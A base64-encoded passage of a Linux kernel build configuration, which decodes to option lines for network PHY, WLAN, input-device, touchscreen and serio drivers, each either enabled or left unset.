TkFfUEhZIGlzIG5vdCBzZXQKIyBDT05GSUdfREFWSUNPTV9QSFkgaXMgbm90IHNldAojIENPTkZJ
R19JQ1BMVVNfUEhZIGlzIG5vdCBzZXQKIyBDT05GSUdfTFhUX1BIWSBpcyBub3Qgc2V0CiMgQ09O
RklHX0lOVEVMX1hXQVlfUEhZIGlzIG5vdCBzZXQKIyBDT05GSUdfTFNJX0VUMTAxMUNfUEhZIGlz
IG5vdCBzZXQKIyBDT05GSUdfTUFSVkVMTF9QSFkgaXMgbm90IHNldAojIENPTkZJR19NQVJWRUxM
XzEwR19QSFkgaXMgbm90IHNldAojIENPTkZJR19NQVJWRUxMXzg4UTJYWFhfUEhZIGlzIG5vdCBz
ZXQKIyBDT05GSUdfTUFSVkVMTF84OFgyMjIyX1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX01BWExJ
TkVBUl9HUEhZIGlzIG5vdCBzZXQKIyBDT05GSUdfTUVESUFURUtfR0VfUEhZIGlzIG5vdCBzZXQK
IyBDT05GSUdfTUlDUkVMX1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX01JQ1JPQ0hJUF9UMVNfUEhZ
IGlzIG5vdCBzZXQKIyBDT05GSUdfTUlDUk9DSElQX1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX01J
Q1JPQ0hJUF9UMV9QSFkgaXMgbm90IHNldAojIENPTkZJR19NSUNST1NFTUlfUEhZIGlzIG5vdCBz
ZXQKIyBDT05GSUdfTU9UT1JDT01NX1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX05BVElPTkFMX1BI
WSBpcyBub3Qgc2V0CiMgQ09ORklHX05YUF9DQlRYX1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX05Y
UF9DNDVfVEpBMTFYWF9QSFkgaXMgbm90IHNldAojIENPTkZJR19OWFBfVEpBMTFYWF9QSFkgaXMg
bm90IHNldAojIENPTkZJR19OQ04yNjAwMF9QSFkgaXMgbm90IHNldAojIENPTkZJR19RQ0E4M1hY
X1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX1FDQTgwOFhfUEhZIGlzIG5vdCBzZXQKIyBDT05GSUdf
UVNFTUlfUEhZIGlzIG5vdCBzZXQKQ09ORklHX1JFQUxURUtfUEhZPXkKIyBDT05GSUdfUkVORVNB
U19QSFkgaXMgbm90IHNldAojIENPTkZJR19ST0NLQ0hJUF9QSFkgaXMgbm90IHNldAojIENPTkZJ
R19TTVNDX1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX1NURTEwWFAgaXMgbm90IHNldAojIENPTkZJ
R19URVJBTkVUSUNTX1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX0RQODM4MjJfUEhZIGlzIG5vdCBz
ZXQKIyBDT05GSUdfRFA4M1RDODExX1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX0RQODM4NDhfUEhZ
IGlzIG5vdCBzZXQKIyBDT05GSUdfRFA4Mzg2N19QSFkgaXMgbm90IHNldAojIENPTkZJR19EUDgz
ODY5X1BIWSBpcyBub3Qgc2V0CiMgQ09ORklHX0RQODNURDUxMF9QSFkgaXMgbm90IHNldAojIENP
TkZJR19EUDgzVEc3MjBfUEhZIGlzIG5vdCBzZXQKIyBDT05GSUdfVklURVNTRV9QSFkgaXMgbm90
IHNldAojIENPTkZJR19YSUxJTlhfR01JSTJSR01JSSBpcyBub3Qgc2V0CkNPTkZJR19NRElPX0RF
VklDRT15CkNPTkZJR19NRElPX0JVUz15CkNPTkZJR19GV05PREVfTURJTz15CkNPTkZJR19BQ1BJ
X01ESU89eQpDT05GSUdfTURJT19ERVZSRVM9eQojIENPTkZJR19NRElPX0JJVEJBTkcgaXMgbm90
IHNldAojIENPTkZJR19NRElPX0JDTV9VTklNQUMgaXMgbm90IHNldAojIENPTkZJR19NRElPX01W
VVNCIGlzIG5vdCBzZXQKIyBDT05GSUdfTURJT19USFVOREVSIGlzIG5vdCBzZXQKCiMKIyBNRElP
IE11bHRpcGxleGVycwojCgojCiMgUENTIGRldmljZSBkcml2ZXJzCiMKIyBDT05GSUdfUENTX1hQ
Q1MgaXMgbm90IHNldAojIGVuZCBvZiBQQ1MgZGV2aWNlIGRyaXZlcnMKCiMgQ09ORklHX1BQUCBp
cyBub3Qgc2V0CiMgQ09ORklHX1NMSVAgaXMgbm90IHNldApDT05GSUdfVVNCX05FVF9EUklWRVJT
PXkKIyBDT05GSUdfVVNCX0NBVEMgaXMgbm90IHNldAojIENPTkZJR19VU0JfS0FXRVRIIGlzIG5v
dCBzZXQKIyBDT05GSUdfVVNCX1BFR0FTVVMgaXMgbm90IHNldAojIENPTkZJR19VU0JfUlRMODE1
MCBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9SVEw4MTUyIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNC
X0xBTjc4WFggaXMgbm90IHNldAojIENPTkZJR19VU0JfVVNCTkVUIGlzIG5vdCBzZXQKIyBDT05G
SUdfVVNCX0hTTyBpcyBub3Qgc2V0CiMgQ09ORklHX1VTQl9JUEhFVEggaXMgbm90IHNldApDT05G
SUdfV0xBTj15CkNPTkZJR19XTEFOX1ZFTkRPUl9BRE1URUs9eQojIENPTkZJR19BRE04MjExIGlz
IG5vdCBzZXQKQ09ORklHX1dMQU5fVkVORE9SX0FUSD15CiMgQ09ORklHX0FUSF9ERUJVRyBpcyBu
b3Qgc2V0CiMgQ09ORklHX0FUSDVLIGlzIG5vdCBzZXQKIyBDT05GSUdfQVRINUtfUENJIGlzIG5v
dCBzZXQKIyBDT05GSUdfQVRIOUsgaXMgbm90IHNldAojIENPTkZJR19BVEg5S19IVEMgaXMgbm90
IHNldAojIENPTkZJR19DQVJMOTE3MCBpcyBub3Qgc2V0CiMgQ09ORklHX0FUSDZLTCBpcyBub3Qg
c2V0CiMgQ09ORklHX0FSNTUyMyBpcyBub3Qgc2V0CiMgQ09ORklHX1dJTDYyMTAgaXMgbm90IHNl
dAojIENPTkZJR19BVEgxMEsgaXMgbm90IHNldAojIENPTkZJR19XQ04zNlhYIGlzIG5vdCBzZXQK
IyBDT05GSUdfQVRIMTFLIGlzIG5vdCBzZXQKIyBDT05GSUdfQVRIMTJLIGlzIG5vdCBzZXQKQ09O
RklHX1dMQU5fVkVORE9SX0FUTUVMPXkKIyBDT05GSUdfQVQ3NkM1MFhfVVNCIGlzIG5vdCBzZXQK
Q09ORklHX1dMQU5fVkVORE9SX0JST0FEQ09NPXkKIyBDT05GSUdfQjQzIGlzIG5vdCBzZXQKIyBD
T05GSUdfQjQzTEVHQUNZIGlzIG5vdCBzZXQKIyBDT05GSUdfQlJDTVNNQUMgaXMgbm90IHNldAoj
IENPTkZJR19CUkNNRk1BQyBpcyBub3Qgc2V0CkNPTkZJR19XTEFOX1ZFTkRPUl9JTlRFTD15CiMg
Q09ORklHX0lQVzIxMDAgaXMgbm90IHNldAojIENPTkZJR19JUFcyMjAwIGlzIG5vdCBzZXQKIyBD
T05GSUdfSVdMNDk2NSBpcyBub3Qgc2V0CiMgQ09ORklHX0lXTDM5NDUgaXMgbm90IHNldAojIENP
TkZJR19JV0xXSUZJIGlzIG5vdCBzZXQKQ09ORklHX1dMQU5fVkVORE9SX0lOVEVSU0lMPXkKIyBD
T05GSUdfUDU0X0NPTU1PTiBpcyBub3Qgc2V0CkNPTkZJR19XTEFOX1ZFTkRPUl9NQVJWRUxMPXkK
IyBDT05GSUdfTElCRVJUQVMgaXMgbm90IHNldAojIENPTkZJR19MSUJFUlRBU19USElORklSTSBp
cyBub3Qgc2V0CiMgQ09ORklHX01XSUZJRVggaXMgbm90IHNldAojIENPTkZJR19NV0w4SyBpcyBu
b3Qgc2V0CkNPTkZJR19XTEFOX1ZFTkRPUl9NRURJQVRFSz15CiMgQ09ORklHX01UNzYwMVUgaXMg
bm90IHNldAojIENPTkZJR19NVDc2eDBVIGlzIG5vdCBzZXQKIyBDT05GSUdfTVQ3NngwRSBpcyBu
b3Qgc2V0CiMgQ09ORklHX01UNzZ4MkUgaXMgbm90IHNldAojIENPTkZJR19NVDc2eDJVIGlzIG5v
dCBzZXQKIyBDT05GSUdfTVQ3NjAzRSBpcyBub3Qgc2V0CiMgQ09ORklHX01UNzYxNUUgaXMgbm90
IHNldAojIENPTkZJR19NVDc2NjNVIGlzIG5vdCBzZXQKIyBDT05GSUdfTVQ3OTE1RSBpcyBub3Qg
c2V0CiMgQ09ORklHX01UNzkyMUUgaXMgbm90IHNldAojIENPTkZJR19NVDc5MjFVIGlzIG5vdCBz
ZXQKIyBDT05GSUdfTVQ3OTk2RSBpcyBub3Qgc2V0CiMgQ09ORklHX01UNzkyNUUgaXMgbm90IHNl
dAojIENPTkZJR19NVDc5MjVVIGlzIG5vdCBzZXQKQ09ORklHX1dMQU5fVkVORE9SX01JQ1JPQ0hJ
UD15CkNPTkZJR19XTEFOX1ZFTkRPUl9QVVJFTElGST15CiMgQ09ORklHX1BMRlhMQyBpcyBub3Qg
c2V0CkNPTkZJR19XTEFOX1ZFTkRPUl9SQUxJTks9eQojIENPTkZJR19SVDJYMDAgaXMgbm90IHNl
dApDT05GSUdfV0xBTl9WRU5ET1JfUkVBTFRFSz15CiMgQ09ORklHX1JUTDgxODAgaXMgbm90IHNl
dAojIENPTkZJR19SVEw4MTg3IGlzIG5vdCBzZXQKQ09ORklHX1JUTF9DQVJEUz15CiMgQ09ORklH
X1JUTDgxOTJDRSBpcyBub3Qgc2V0CiMgQ09ORklHX1JUTDgxOTJTRSBpcyBub3Qgc2V0CiMgQ09O
RklHX1JUTDgxOTJERSBpcyBub3Qgc2V0CiMgQ09ORklHX1JUTDg3MjNBRSBpcyBub3Qgc2V0CiMg
Q09ORklHX1JUTDg3MjNCRSBpcyBub3Qgc2V0CiMgQ09ORklHX1JUTDgxODhFRSBpcyBub3Qgc2V0
CiMgQ09ORklHX1JUTDgxOTJFRSBpcyBub3Qgc2V0CiMgQ09ORklHX1JUTDg4MjFBRSBpcyBub3Qg
c2V0CiMgQ09ORklHX1JUTDgxOTJDVSBpcyBub3Qgc2V0CiMgQ09ORklHX1JUTDgxOTJEVSBpcyBu
b3Qgc2V0CiMgQ09ORklHX1JUTDhYWFhVIGlzIG5vdCBzZXQKIyBDT05GSUdfUlRXODggaXMgbm90
IHNldAojIENPTkZJR19SVFc4OSBpcyBub3Qgc2V0CkNPTkZJR19XTEFOX1ZFTkRPUl9SU0k9eQoj
IENPTkZJR19SU0lfOTFYIGlzIG5vdCBzZXQKQ09ORklHX1dMQU5fVkVORE9SX1NJTEFCUz15CkNP
TkZJR19XTEFOX1ZFTkRPUl9TVD15CiMgQ09ORklHX0NXMTIwMCBpcyBub3Qgc2V0CkNPTkZJR19X
TEFOX1ZFTkRPUl9UST15CiMgQ09ORklHX1dMMTI1MSBpcyBub3Qgc2V0CiMgQ09ORklHX1dMMTJY
WCBpcyBub3Qgc2V0CiMgQ09ORklHX1dMMThYWCBpcyBub3Qgc2V0CiMgQ09ORklHX1dMQ09SRSBp
cyBub3Qgc2V0CkNPTkZJR19XTEFOX1ZFTkRPUl9aWURBUz15CiMgQ09ORklHX1pEMTIxMVJXIGlz
IG5vdCBzZXQKQ09ORklHX1dMQU5fVkVORE9SX1FVQU5URU5OQT15CiMgQ09ORklHX1FUTkZNQUNf
UENJRSBpcyBub3Qgc2V0CiMgQ09ORklHX01BQzgwMjExX0hXU0lNIGlzIG5vdCBzZXQKIyBDT05G
SUdfVklSVF9XSUZJIGlzIG5vdCBzZXQKIyBDT05GSUdfV0FOIGlzIG5vdCBzZXQKCiMKIyBXaXJl
bGVzcyBXQU4KIwojIENPTkZJR19XV0FOIGlzIG5vdCBzZXQKIyBlbmQgb2YgV2lyZWxlc3MgV0FO
CgojIENPTkZJR19WTVhORVQzIGlzIG5vdCBzZXQKIyBDT05GSUdfRlVKSVRTVV9FUyBpcyBub3Qg
c2V0CiMgQ09ORklHX05FVERFVlNJTSBpcyBub3Qgc2V0CkNPTkZJR19ORVRfRkFJTE9WRVI9eQoj
IENPTkZJR19JU0ROIGlzIG5vdCBzZXQKCiMKIyBJbnB1dCBkZXZpY2Ugc3VwcG9ydAojCkNPTkZJ
R19JTlBVVD15CkNPTkZJR19JTlBVVF9MRURTPXkKQ09ORklHX0lOUFVUX0ZGX01FTUxFU1M9eQpD
T05GSUdfSU5QVVRfU1BBUlNFS01BUD15CiMgQ09ORklHX0lOUFVUX01BVFJJWEtNQVAgaXMgbm90
IHNldApDT05GSUdfSU5QVVRfVklWQUxESUZNQVA9eQoKIwojIFVzZXJsYW5kIGludGVyZmFjZXMK
IwojIENPTkZJR19JTlBVVF9NT1VTRURFViBpcyBub3Qgc2V0CiMgQ09ORklHX0lOUFVUX0pPWURF
ViBpcyBub3Qgc2V0CkNPTkZJR19JTlBVVF9FVkRFVj15CiMgQ09ORklHX0lOUFVUX0VWQlVHIGlz
IG5vdCBzZXQKCiMKIyBJbnB1dCBEZXZpY2UgRHJpdmVycwojCkNPTkZJR19JTlBVVF9LRVlCT0FS
RD15CiMgQ09ORklHX0tFWUJPQVJEX0FEUDU1ODggaXMgbm90IHNldAojIENPTkZJR19LRVlCT0FS
RF9BRFA1NTg5IGlzIG5vdCBzZXQKQ09ORklHX0tFWUJPQVJEX0FUS0JEPXkKIyBDT05GSUdfS0VZ
Qk9BUkRfUVQxMDUwIGlzIG5vdCBzZXQKIyBDT05GSUdfS0VZQk9BUkRfUVQxMDcwIGlzIG5vdCBz
ZXQKIyBDT05GSUdfS0VZQk9BUkRfUVQyMTYwIGlzIG5vdCBzZXQKIyBDT05GSUdfS0VZQk9BUkRf
RExJTktfRElSNjg1IGlzIG5vdCBzZXQKIyBDT05GSUdfS0VZQk9BUkRfTEtLQkQgaXMgbm90IHNl
dAojIENPTkZJR19LRVlCT0FSRF9UQ0E2NDE2IGlzIG5vdCBzZXQKIyBDT05GSUdfS0VZQk9BUkRf
VENBODQxOCBpcyBub3Qgc2V0CiMgQ09ORklHX0tFWUJPQVJEX0xNODMyMyBpcyBub3Qgc2V0CiMg
Q09ORklHX0tFWUJPQVJEX0xNODMzMyBpcyBub3Qgc2V0CiMgQ09ORklHX0tFWUJPQVJEX01BWDcz
NTkgaXMgbm90IHNldAojIENPTkZJR19LRVlCT0FSRF9NQ1MgaXMgbm90IHNldAojIENPTkZJR19L
RVlCT0FSRF9NUFIxMjEgaXMgbm90IHNldAojIENPTkZJR19LRVlCT0FSRF9ORVdUT04gaXMgbm90
IHNldAojIENPTkZJR19LRVlCT0FSRF9PUEVOQ09SRVMgaXMgbm90IHNldAojIENPTkZJR19LRVlC
T0FSRF9TVE9XQVdBWSBpcyBub3Qgc2V0CiMgQ09ORklHX0tFWUJPQVJEX1NVTktCRCBpcyBub3Qg
c2V0CiMgQ09ORklHX0tFWUJPQVJEX1RNMl9UT1VDSEtFWSBpcyBub3Qgc2V0CiMgQ09ORklHX0tF
WUJPQVJEX1hUS0JEIGlzIG5vdCBzZXQKIyBDT05GSUdfS0VZQk9BUkRfQ1lQUkVTU19TRiBpcyBu
b3Qgc2V0CkNPTkZJR19JTlBVVF9NT1VTRT15CkNPTkZJR19NT1VTRV9QUzI9eQpDT05GSUdfTU9V
U0VfUFMyX0FMUFM9eQpDT05GSUdfTU9VU0VfUFMyX0JZRD15CkNPTkZJR19NT1VTRV9QUzJfTE9H
SVBTMlBQPXkKQ09ORklHX01PVVNFX1BTMl9TWU5BUFRJQ1M9eQpDT05GSUdfTU9VU0VfUFMyX1NZ
TkFQVElDU19TTUJVUz15CkNPTkZJR19NT1VTRV9QUzJfQ1lQUkVTUz15CkNPTkZJR19NT1VTRV9Q
UzJfTElGRUJPT0s9eQpDT05GSUdfTU9VU0VfUFMyX1RSQUNLUE9JTlQ9eQojIENPTkZJR19NT1VT
RV9QUzJfRUxBTlRFQ0ggaXMgbm90IHNldAojIENPTkZJR19NT1VTRV9QUzJfU0VOVEVMSUMgaXMg
bm90IHNldAojIENPTkZJR19NT1VTRV9QUzJfVE9VQ0hLSVQgaXMgbm90IHNldApDT05GSUdfTU9V
U0VfUFMyX0ZPQ0FMVEVDSD15CiMgQ09ORklHX01PVVNFX1BTMl9WTU1PVVNFIGlzIG5vdCBzZXQK
Q09ORklHX01PVVNFX1BTMl9TTUJVUz15CiMgQ09ORklHX01PVVNFX1NFUklBTCBpcyBub3Qgc2V0
CiMgQ09ORklHX01PVVNFX0FQUExFVE9VQ0ggaXMgbm90IHNldAojIENPTkZJR19NT1VTRV9CQ001
OTc0IGlzIG5vdCBzZXQKIyBDT05GSUdfTU9VU0VfQ1lBUEEgaXMgbm90IHNldAojIENPTkZJR19N
T1VTRV9FTEFOX0kyQyBpcyBub3Qgc2V0CiMgQ09ORklHX01PVVNFX1ZTWFhYQUEgaXMgbm90IHNl
dAojIENPTkZJR19NT1VTRV9TWU5BUFRJQ1NfSTJDIGlzIG5vdCBzZXQKIyBDT05GSUdfTU9VU0Vf
U1lOQVBUSUNTX1VTQiBpcyBub3Qgc2V0CkNPTkZJR19JTlBVVF9KT1lTVElDSz15CiMgQ09ORklH
X0pPWVNUSUNLX0FOQUxPRyBpcyBub3Qgc2V0CiMgQ09ORklHX0pPWVNUSUNLX0EzRCBpcyBub3Qg
c2V0CiMgQ09ORklHX0pPWVNUSUNLX0FESSBpcyBub3Qgc2V0CiMgQ09ORklHX0pPWVNUSUNLX0NP
QlJBIGlzIG5vdCBzZXQKIyBDT05GSUdfSk9ZU1RJQ0tfR0YySyBpcyBub3Qgc2V0CiMgQ09ORklH
X0pPWVNUSUNLX0dSSVAgaXMgbm90IHNldAojIENPTkZJR19KT1lTVElDS19HUklQX01QIGlzIG5v
dCBzZXQKIyBDT05GSUdfSk9ZU1RJQ0tfR1VJTExFTU9UIGlzIG5vdCBzZXQKIyBDT05GSUdfSk9Z
U1RJQ0tfSU5URVJBQ1QgaXMgbm90IHNldAojIENPTkZJR19KT1lTVElDS19TSURFV0lOREVSIGlz
IG5vdCBzZXQKIyBDT05GSUdfSk9ZU1RJQ0tfVE1EQyBpcyBub3Qgc2V0CiMgQ09ORklHX0pPWVNU
SUNLX0lGT1JDRSBpcyBub3Qgc2V0CiMgQ09ORklHX0pPWVNUSUNLX1dBUlJJT1IgaXMgbm90IHNl
dAojIENPTkZJR19KT1lTVElDS19NQUdFTExBTiBpcyBub3Qgc2V0CiMgQ09ORklHX0pPWVNUSUNL
X1NQQUNFT1JCIGlzIG5vdCBzZXQKIyBDT05GSUdfSk9ZU1RJQ0tfU1BBQ0VCQUxMIGlzIG5vdCBz
ZXQKIyBDT05GSUdfSk9ZU1RJQ0tfU1RJTkdFUiBpcyBub3Qgc2V0CiMgQ09ORklHX0pPWVNUSUNL
X1RXSURKT1kgaXMgbm90IHNldAojIENPTkZJR19KT1lTVElDS19aSEVOSFVBIGlzIG5vdCBzZXQK
IyBDT05GSUdfSk9ZU1RJQ0tfQVM1MDExIGlzIG5vdCBzZXQKIyBDT05GSUdfSk9ZU1RJQ0tfSk9Z
RFVNUCBpcyBub3Qgc2V0CiMgQ09ORklHX0pPWVNUSUNLX1hQQUQgaXMgbm90IHNldAojIENPTkZJ
R19KT1lTVElDS19QWFJDIGlzIG5vdCBzZXQKIyBDT05GSUdfSk9ZU1RJQ0tfUVdJSUMgaXMgbm90
IHNldAojIENPTkZJR19KT1lTVElDS19GU0lBNkIgaXMgbm90IHNldAojIENPTkZJR19KT1lTVElD
S19TRU5TRUhBVCBpcyBub3Qgc2V0CiMgQ09ORklHX0pPWVNUSUNLX1NFRVNBVyBpcyBub3Qgc2V0
CkNPTkZJR19JTlBVVF9UQUJMRVQ9eQojIENPTkZJR19UQUJMRVRfVVNCX0FDRUNBRCBpcyBub3Qg
c2V0CiMgQ09ORklHX1RBQkxFVF9VU0JfQUlQVEVLIGlzIG5vdCBzZXQKIyBDT05GSUdfVEFCTEVU
X1VTQl9IQU5XQU5HIGlzIG5vdCBzZXQKIyBDT05GSUdfVEFCTEVUX1VTQl9LQlRBQiBpcyBub3Qg
c2V0CiMgQ09ORklHX1RBQkxFVF9VU0JfUEVHQVNVUyBpcyBub3Qgc2V0CiMgQ09ORklHX1RBQkxF
VF9TRVJJQUxfV0FDT000IGlzIG5vdCBzZXQKQ09ORklHX0lOUFVUX1RPVUNIU0NSRUVOPXkKIyBD
T05GSUdfVE9VQ0hTQ1JFRU5fQUQ3ODc5IGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5f
QVRNRUxfTVhUIGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fQlUyMTAxMyBpcyBub3Qg
c2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0JVMjEwMjkgaXMgbm90IHNldAojIENPTkZJR19UT1VD
SFNDUkVFTl9DSElQT05FX0lDTjg1MDUgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9D
WThDVE1BMTQwIGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fQ1lUVFNQX0NPUkUgaXMg
bm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9DWVRUU1A0X0NPUkUgaXMgbm90IHNldAojIENP
TkZJR19UT1VDSFNDUkVFTl9DWVRUU1A1IGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5f
RFlOQVBSTyBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0hBTVBTSElSRSBpcyBub3Qg
c2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0VFVEkgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFND
UkVFTl9FR0FMQVhfU0VSSUFMIGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fRVhDMzAw
MCBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0ZVSklUU1UgaXMgbm90IHNldAojIENP
TkZJR19UT1VDSFNDUkVFTl9HT09ESVhfQkVSTElOX0kyQyBpcyBub3Qgc2V0CiMgQ09ORklHX1RP
VUNIU0NSRUVOX0hJREVFUCBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0hZQ09OX0hZ
NDZYWCBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0hZTklUUk9OX0NTVFhYWCBpcyBu
b3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0lMSTIxMFggaXMgbm90IHNldAojIENPTkZJR19U
T1VDSFNDUkVFTl9JTElURUsgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9TNlNZNzYx
IGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fR1VOWkUgaXMgbm90IHNldAojIENPTkZJ
R19UT1VDSFNDUkVFTl9FS1RGMjEyNyBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0VM
QU4gaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9FTE8gaXMgbm90IHNldAojIENPTkZJ
R19UT1VDSFNDUkVFTl9XQUNPTV9XODAwMSBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVO
X1dBQ09NX0kyQyBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX01BWDExODAxIGlzIG5v
dCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fTUNTNTAwMCBpcyBub3Qgc2V0CiMgQ09ORklHX1RP
VUNIU0NSRUVOX01NUzExNCBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX01FTEZBU19N
SVA0IGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fTVRPVUNIIGlzIG5vdCBzZXQKIyBD
T05GSUdfVE9VQ0hTQ1JFRU5fTk9WQVRFS19OVlRfVFMgaXMgbm90IHNldAojIENPTkZJR19UT1VD
SFNDUkVFTl9JTUFHSVMgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9JTkVYSU8gaXMg
bm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9QRU5NT1VOVCBpcyBub3Qgc2V0CiMgQ09ORklH
X1RPVUNIU0NSRUVOX0VEVF9GVDVYMDYgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9U
T1VDSFJJR0hUIGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fVE9VQ0hXSU4gaXMgbm90
IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9QSVhDSVIgaXMgbm90IHNldAojIENPTkZJR19UT1VD
SFNDUkVFTl9XRFQ4N1hYX0kyQyBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX1VTQl9D
T01QT1NJVEUgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9UT1VDSElUMjEzIGlzIG5v
dCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fVFNDX1NFUklPIGlzIG5vdCBzZXQKIyBDT05GSUdf
VE9VQ0hTQ1JFRU5fVFNDMjAwNCBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX1RTQzIw
MDcgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9TSUxFQUQgaXMgbm90IHNldAojIENP
TkZJR19UT1VDSFNDUkVFTl9TVDEyMzIgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9T
VE1GVFMgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9TWDg2NTQgaXMgbm90IHNldAoj
IENPTkZJR19UT1VDSFNDUkVFTl9UUFM2NTA3WCBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NS
RUVOX1pFVDYyMjMgaXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9ST0hNX0JVMjEwMjMg
aXMgbm90IHNldAojIENPTkZJR19UT1VDSFNDUkVFTl9JUVM1WFggaXMgbm90IHNldAojIENPTkZJ
R19UT1VDSFNDUkVFTl9JUVM3MjExIGlzIG5vdCBzZXQKIyBDT05GSUdfVE9VQ0hTQ1JFRU5fWklO
SVRJWCBpcyBub3Qgc2V0CiMgQ09ORklHX1RPVUNIU0NSRUVOX0hJTUFYX0hYODMxMTJCIGlzIG5v
dCBzZXQKQ09ORklHX0lOUFVUX01JU0M9eQojIENPTkZJR19JTlBVVF9BRDcxNFggaXMgbm90IHNl
dAojIENPTkZJR19JTlBVVF9CTUExNTAgaXMgbm90IHNldAojIENPTkZJR19JTlBVVF9FM1gwX0JV
VFRPTiBpcyBub3Qgc2V0CiMgQ09ORklHX0lOUFVUX1BDU1BLUiBpcyBub3Qgc2V0CiMgQ09ORklH
X0lOUFVUX01NQTg0NTAgaXMgbm90IHNldAojIENPTkZJR19JTlBVVF9BUEFORUwgaXMgbm90IHNl
dAojIENPTkZJR19JTlBVVF9BVExBU19CVE5TIGlzIG5vdCBzZXQKIyBDT05GSUdfSU5QVVRfQVRJ
X1JFTU9URTIgaXMgbm90IHNldAojIENPTkZJR19JTlBVVF9LRVlTUEFOX1JFTU9URSBpcyBub3Qg
c2V0CiMgQ09ORklHX0lOUFVUX0tYVEo5IGlzIG5vdCBzZXQKIyBDT05GSUdfSU5QVVRfUE9XRVJN
QVRFIGlzIG5vdCBzZXQKIyBDT05GSUdfSU5QVVRfWUVBTElOSyBpcyBub3Qgc2V0CiMgQ09ORklH
X0lOUFVUX0NNMTA5IGlzIG5vdCBzZXQKIyBDT05GSUdfSU5QVVRfVUlOUFVUIGlzIG5vdCBzZXQK
IyBDT05GSUdfSU5QVVRfUENGODU3NCBpcyBub3Qgc2V0CiMgQ09ORklHX0lOUFVUX0RBNzI4MF9I
QVBUSUNTIGlzIG5vdCBzZXQKIyBDT05GSUdfSU5QVVRfQURYTDM0WCBpcyBub3Qgc2V0CiMgQ09O
RklHX0lOUFVUX0lNU19QQ1UgaXMgbm90IHNldAojIENPTkZJR19JTlBVVF9JUVMyNjlBIGlzIG5v
dCBzZXQKIyBDT05GSUdfSU5QVVRfSVFTNjI2QSBpcyBub3Qgc2V0CiMgQ09ORklHX0lOUFVUX0lR
UzcyMjIgaXMgbm90IHNldAojIENPTkZJR19JTlBVVF9DTUEzMDAwIGlzIG5vdCBzZXQKIyBDT05G
SUdfSU5QVVRfSURFQVBBRF9TTElERUJBUiBpcyBub3Qgc2V0CiMgQ09ORklHX0lOUFVUX0RSVjI2
NjVfSEFQVElDUyBpcyBub3Qgc2V0CiMgQ09ORklHX0lOUFVUX0RSVjI2NjdfSEFQVElDUyBpcyBu
b3Qgc2V0CiMgQ09ORklHX1JNSTRfQ09SRSBpcyBub3Qgc2V0CgojCiMgSGFyZHdhcmUgSS9PIHBv
cnRzCiMKQ09ORklHX1NFUklPPXkKQ09ORklHX0FSQ0hfTUlHSFRfSEFWRV9QQ19TRVJJTz15CkNP
TkZJR19TRVJJT19JODA0Mj15CkNPTkZJR19TRVJJT19TRVJQT1JUPXkKIyBDT05GSUdfU0VSSU9f
Q1Q4MkM3MTAgaXMgbm90IHNldAojIENPTkZJR19TRVJJT19QQ0lQUzIgaXMgbm90IHNldApDT05G
SUdfU0VSSU9fTElCUFMyPXkKIyBDT05GSUdfU0VSSU9fUkFXIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VSSU9fQUxURVJBX1BTMiBpcyBub3Qgc2V0CiMgQ09ORklHX1NFUklPX1BTMk1VTFQgaXMgbm90
